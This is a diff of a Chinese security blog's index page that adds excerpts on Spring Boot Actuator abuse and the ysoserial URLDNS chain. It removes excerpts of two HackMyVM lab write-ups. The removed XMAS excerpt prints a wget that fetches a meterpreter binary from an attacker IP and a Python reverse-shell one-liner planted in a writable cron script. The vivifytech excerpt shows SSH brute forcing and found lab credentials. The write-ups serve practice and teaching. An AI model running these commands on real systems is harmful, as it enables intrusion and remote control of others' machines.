@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-	<meta name="generator" content="Hugo 0.146.3">
+	<meta name="generator" content="Hugo 0.147.0">
     
       <title>l1uyun</title>
     
@@ -161,6 +161,70 @@ if ( false || (!!window.MSInputMethodContext && !!document.documentMode)) {
   
 
   <div class="posts">
+    
+    <div class="post on-list">
+      <h1 class="post-title"><a href="https://l1uyun.one/posts/javasec-springboot%E6%A1%86%E6%9E%B6%E5%88%A9%E7%94%A8/">springboot利用</a></h1>
+      <div class="post-meta">
+        
+          <span class="post-date">
+            2024-08-06
+          </span>
+        
+
+        
+        <span class="">
+          
+            #<a href="https://l1uyun.one/tags/sec/javasec/">sec/javasec</a>&nbsp;
+          
+        </span>
+        
+      </div>
+
+      
+
+      <div class="post-content">
+        <h1 id="springboot利用">springboot利用</h1>
+<h1 id="前置知识">前置知识</h1>
+<h2 id="springboot-actuator">SpringBoot Actuator</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Spring Boot Actuator 1.x 版本默认内置路由的起始路径为 / ，2.x 版本则统一以 /actuator 为起始路径
+</span></span><span style="display:flex;"><span>Spring Boot Actuator 默认的内置路由名字，如 /env 有时候也会被程序员修改，比如修改成 /appenv
+</span></span></code></pre></div><p>一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞，但是以 “默认安全” 来讲，不暴露出这些信息更加安全。</p>
+<p>对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞。</p>
+      </div>
+      
+        <div><a class="read-more button" href="/posts/javasec-springboot%E6%A1%86%E6%9E%B6%E5%88%A9%E7%94%A8/">阅读全文 →</a></div>
+      
+    </div>
+    
+    <div class="post on-list">
+      <h1 class="post-title"><a href="https://l1uyun.one/posts/javasec-urldns%E9%93%BE/">javasec-urldns链</a></h1>
+      <div class="post-meta">
+        
+          <span class="post-date">
+            2024-08-03
+          </span>
+        
+
+        
+        <span class="">
+          
+            #<a href="https://l1uyun.one/tags/sec/javasec/">sec/javasec</a>&nbsp;
+          
+        </span>
+        
+      </div>
+
+      
+
+      <div class="post-content">
+        <h1 id="urldns链">urldns链</h1>
+<p>URLDNS 是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。</p>
+<p>虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时使⽤</p>
+      </div>
+      
+        <div><a class="read-more button" href="/posts/javasec-urldns%E9%93%BE/">阅读全文 →</a></div>
+      
+    </div>
     
     <div class="post on-list">
       <h1 class="post-title"><a href="https://l1uyun.one/posts/javasec-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">javasec-反序列化</a></h1>
@@ -547,119 +611,6 @@ hydra 好慢
       
     </div>
     
-    <div class="post on-list">
-      <h1 class="post-title"><a href="https://l1uyun.one/posts/hmm_xmas/">XMAS</a></h1>
-      <div class="post-meta">
-        
-          <span class="post-date">
-            2024-02-14
-          </span>
-        
-
-        
-        <span class="">
-          
-            #<a href="https://l1uyun.one/tags/sec/hackmyvm/">sec/hackmyvm</a>&nbsp;
-          
-        </span>
-        
-      </div>
-
-      
-
-      <div class="post-content">
-        <h2 id="靶机-启动">靶机, 启动</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.10.16
-</span></span></code></pre></div><h2 id="端口扫描">端口扫描</h2>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_1.png" alt="HMM_XMAS_image_1"  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_2.png" alt="HMM_XMAS_image_2"  /></p>
-<h2 id="web-服务">web 服务</h2>
-<p>目录扫描</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_3.png" alt="HMM_XMAS_image_3"  /></p>
-<p>在主页的下面发现了一个上传点, 直接上传反弹 shell</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_4.png" alt="HMM_XMAS_image_4"  /></p>
-<p>使用 nc 失败, 换成了 webshell</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_5.png" alt="HMM_XMAS_image_5"  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_6.png" alt="HMM_XMAS_image_6"  />
-然后还是用了 meterpreter</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://192.168.10.11:8000/shell.elf -O /tmp/shell.elf<span style="color:#f92672">&amp;&amp;</span>chmod <span style="color:#ae81ff">777</span> /tmp/shell.elf
-</span></span></code></pre></div><h2 id="www-data-进一步收集信息">www-data ,进一步收集信息</h2>
-<p>/home/alabaster/nice_list. txt</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_7.png" alt="HMM_XMAS_image_7"  /></p>
-<p>这有个 python 代码,. 在 linpeas. sh 枚举之后发现是定时任务, 并且是可写的</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_8.png" alt="HMM_XMAS_image_8"  /></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.10.11&#34;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;bash&#34;)&#39;</span> &gt; nice_or_naughty.py
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;import subprocess; subprocess.call([&#34;/tmp/newshell.elf&#34;])&#39;</span> &gt; nice_or_naughty.py
-</span></span></code></pre></div><p>又是这样子不稳定的 shell</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_9.png" alt="HMM_XMAS_image_9"  /></p>
-<p>上传一个 socat 二进制文件上去算了</p>
-      </div>
-      
-        <div><a class="read-more button" href="/posts/hmm_xmas/">阅读全文 →</a></div>
-      
-    </div>
-    
-    <div class="post on-list">
-      <h1 class="post-title"><a href="https://l1uyun.one/posts/hmm_vivifytech/">vivifytech</a></h1>
-      <div class="post-meta">
-        
-          <span class="post-date">
-            2024-02-13
-          </span>
-        
-
-        
-        <span class="">
-          
-            #<a href="https://l1uyun.one/tags/sec/hackmyvm/">sec/hackmyvm</a>&nbsp;
-          
-        </span>
-        
-      </div>
-
-      
-
-      <div class="post-content">
-        <p>192.168.10.12</p>
-<h2 id="端口扫描">端口扫描</h2>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_1.png" alt="HMM_vivifytech_image_1"  /></p>
-<h2 id="web目录扫描">web目录扫描</h2>
-<p>进一步扫描 WordPress 下的目录</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_2.png" alt="HMM_vivifytech_image_2"  /></p>
-<p>发现敏感文件 secret. txt,</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_3.png" alt="HMM_vivifytech_image_3"  /></p>
-<h2 id="根据收集的用户名-密码爆破-ssh">根据收集的用户名, 密码爆破 ssh</h2>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_4.png" alt="HMM_vivifytech_image_4"  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_5.png" alt="HMM_vivifytech_image_5|400"  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_6.png" alt="HMM_vivifytech_image_6"  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_7.png" alt="HMM_vivifytech_image_7"  /></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sarah:bohicon
-</span></span></code></pre></div><h2 id="user-txt-pwd">USER. txt PWD</h2>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_8.png" alt="HMM_vivifytech_image_8"  /></p>
-<h2 id="收集泄露信息横向移动">收集泄露信息,横向移动</h2>
-<p>jresig secret
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_9.png" alt="HMM_vivifytech_image_9"  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_10.png" alt="HMM_vivifytech_image_10"  /></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sarah@VivifyTech:~/.gnupg/crls.d$ cat DIR.txt
-</span></span><span style="display:flex;"><span>v:1:
-</span></span></code></pre></div><p>在用户目录里面发现了 TASK. txt 文件
-下次应该直接全局找一下. txt 文件</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_11.png" alt="HMM_vivifytech_image_11"  /></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sarah@VivifyTech:~/.private$ cat Tasks.txt
-</span></span><span style="display:flex;"><span>- Change the Design and architecture of the website
-</span></span><span style="display:flex;"><span>- Plan <span style="color:#66d9ef">for</span> an audit, it seems like our website is vulnerable
-</span></span><span style="display:flex;"><span>- Remind the team we need to schedule a party before going to holidays
-</span></span><span style="display:flex;"><span>- Give this cred to the new intern <span style="color:#66d9ef">for</span> some tasks assigned to him - gbodja:4Tch055ouy370N
-</span></span></code></pre></div><h2 id="利用-sudo-git-提权">利用 sudo git 提权</h2>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_vivifytech_image_12.png" alt="HMM_vivifytech_image_12"  /></p>
-      </div>
-      
-        <div><a class="read-more button" href="/posts/hmm_vivifytech/">阅读全文 →</a></div>
-      
-    </div>
-    
     <div class="pagination">
   <div class="pagination__buttons">
     
@@ -760,6 +711,10 @@ hydra 好慢
 
     
 
+    
+
+    
+
 
 
 
@@ -770,7 +725,7 @@ hydra 好慢
 <footer class="footer">
   <div class="footer__inner">
     <div class="copyright copyright-font">
-      <span>共 81976 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
+      <span>共 86497 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
     </div>
       
     
